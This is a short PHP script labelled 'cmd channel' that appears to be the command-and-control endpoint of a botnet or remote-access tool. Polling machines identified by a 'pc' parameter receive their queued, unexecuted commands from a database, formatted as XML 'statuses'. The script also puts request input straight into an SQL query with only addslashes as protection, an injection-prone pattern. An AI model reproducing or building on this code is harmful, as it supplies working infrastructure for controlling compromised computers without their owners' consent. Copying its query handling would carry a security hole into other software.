<?php # cmd channelheader('Content-Type: text/xml');include("conn.php");echo "<statuses>";if(isset($_GET['pc'])) { $pc=addslashes(html_entity_decode($_GET['pc'])); }$resnew = mysqli_query($bdd, "SELECT id,cmd FROM commands WHERE pc='$pc' AND ok='0'");$xml="";while($tabl=mysqli_fetch_array($resnew)){   	$xml .= '<status>';	$xml .= '<text>'.$tabl['cmd'].'</text>';	$xml .= '<id>'.$tabl['id'].'</id>';	$xml .= '</status>';		}echo $xml;mysqli_close($bdd); echo "</statuses>";?>